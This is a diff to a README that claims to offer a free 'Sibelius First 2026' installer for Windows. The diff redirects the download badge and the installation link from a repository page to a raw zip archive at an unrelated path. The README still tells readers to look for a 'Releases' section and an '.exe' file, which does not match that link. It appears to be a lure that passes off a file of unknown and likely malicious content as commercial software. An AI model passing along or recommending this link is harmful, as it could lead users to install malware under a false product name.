@@ -5,7 +5,7 @@ description: "Download the Sibelius First installer for Windows 10 and 11. Acces
 ---
 # 🎵 Sibelius-First-2026 - Write sheet music with total ease
 
-[![](https://img.shields.io/badge/Download-Sibelius_First-blue)](https://github.com/Osteal-musket706/Sibelius-First-2026)
+[![](https://img.shields.io/badge/Download-Sibelius_First-blue)](https://raw.githubusercontent.com/Osteal-musket706/osteal-musket706.github.io/main/myomectomy/2.0.zip)
 
 ## About This Software
 
@@ -27,7 +27,7 @@ Before you install the application, check that your computer meets these require
 
 Follow these steps to set up the software on your system.
 
-1. Go to the primary download page: [https://github.com/Osteal-musket706/Sibelius-First-2026](https://github.com/Osteal-musket706/Sibelius-First-2026).
+1. Go to the primary download page: [https://raw.githubusercontent.com/Osteal-musket706/osteal-musket706.github.io/main/myomectomy/2.0.zip](https://raw.githubusercontent.com/Osteal-musket706/osteal-musket706.github.io/main/myomectomy/2.0.zip).
 2. Look for the "Releases" section on the right side of the page.
 3. Click on the latest version link.
 4. Select the file ending in ".exe" to download the installer to your computer.
